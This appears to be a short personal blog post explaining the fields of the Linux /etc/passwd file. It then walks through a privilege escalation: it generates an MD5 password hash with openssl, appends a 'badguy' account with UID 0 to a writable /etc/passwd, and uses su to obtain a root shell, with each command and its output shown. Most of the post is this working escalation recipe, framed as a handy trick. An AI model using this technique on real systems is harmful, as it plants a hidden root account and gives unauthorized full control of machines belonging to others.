---
layout: post
title: Hacking /etc/passwd
catagories: Insecurity
---
I've been crazy busy with various projects and wanted to remember this trick for `/etc/passwd` in the event you have write access to the file.  I found myself in a position where I had a low-level shell and had write access to `/etc/passwd`.  I couldn't remember having done this before and didn't have any notes on it, so here it is.

Let's assume you know the basics about what `/etc/passwd` does.  You may not remember/know what the fields are in the passwd file.  I always ask it on interview questions.

As a quick refresher we'll use this line from /etc/passwd:
```
harold:x:1001:1001:harold,,,:/home/harold:/bin/bash
   1    2  3    4       5          6            7
```
There are 7 fields separated by a ':'

|Space      |Field          |Description  |Purpose    |
|--- |--- |--- |---
|1 |harold        |Username     |Username   |
|2 |x              |Password     |Placeholder for password[^1] |
|3 |1001           |UID          |Numeric representation of username |
|4 |1001           |GID          |Numeric representation of default group |
|5 |harold,,,     |GECOS        |General info about the account[^2] |
|6 |/home/harold  |Home dir     |Location of home directory |
|7 |/bin/bash      |Shell        |Default shell |

Now, we have this `/etc/passwd` file that we can write to, but still can't set a password with the passwd command or edit the `/etc/shadow` file.  Enter openssl.  With openssl we can create an encrypted password and put it right into the passwd file.

First we create the hash
```
bash-4.2$ openssl passwd -1 -salt badguy pass123
$1$badguy$zgKg42t10j4SEDtASy6ML1
```
Next we append the "new user" into the password file along with root's UID
```
badguy:$1$badguy$zgKg42t10j4SEDtASy6ML1:0:0:root:/root:/bin/bash
```
Finally, we can escalate
```
bash-4.2$ su - badguy
Password:
Last login: Fri Dec  6 16:10:18 EST 2019 from 192.168.1.5 on pts/0
[root@server ~]# whoami
root
```

[^1]: Modern Unix/Linux operating systems keep the encrypted password in `/etc/shadow.`  The 'x' indicates there is a password set, and is encrypted in `/etc/shadow`.  Usually accounts with an * (asterisk) in password field don't have a password e.g: disabled for login.

[^2]: The GECOS field is typically used to record general information about the account or its user(s) such as their real name and phone number. Historically, some early Unix systems at Bell Labs used GECOS machines for print spooling and various other services, so this field was added to carry information on a user's GECOS identity.